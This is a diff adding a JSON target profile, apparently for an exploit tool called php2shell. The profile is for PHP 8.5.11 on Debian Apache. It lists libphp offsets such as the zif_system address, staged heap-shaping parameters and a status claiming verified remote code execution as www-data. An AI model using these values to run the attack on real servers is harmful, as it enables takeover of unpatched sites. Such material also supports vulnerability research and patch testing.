@@ -1,0 +1,68 @@
+{
+  "name": "php-8.5.11-bookworm-amd64-128m",
+  "php_version": "8.5.11",
+  "branch": "8.5",
+  "fixed_in": "8.5.12",
+  "arch": "x86_64",
+  "distro": "debian",
+  "image": "php:8.5.11-apache",
+  "sapi": "apache2handler",
+  "verified": true,
+  "rce": true,
+  "libphp": {
+    "zif_system": "0x5996e0",
+    "zval_ptr_dtor": "0x7b47a0",
+    "htdata": "0x690d8"
+  },
+  "stages": {
+    "stage1_n": 841,
+    "stage1_forge_len": 63,
+    "stage2_t": 406,
+    "stage2_v": 16,
+    "stage3_pads": [
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "stage3_carrier": true
+  },
+  "oom_mb": 12,
+  "oom_margin_mb": 12,
+  "config": {
+    "memory_limit": 134217728,
+    "memory_limit_tested_mb": [
+      8,
+      128
+    ],
+    "post_max_size": 268435456,
+    "max_input_vars": 1000,
+    "display_errors": "On",
+    "session_upload_progress": "On",
+    "session_use_only_cookies": 1,
+    "session_use_strict_mode": 0,
+    "workers": 1
+  },
+  "status": "RCE verified at 128M memory_limit / 256M post_max_size on php:8.5.11-apache (one prefork worker, uid=33/www-data)",
+  "source": "https://github.com/devploit/php2shell/blob/main/profiles/8.5.11-bookworm-amd64.json"
+}
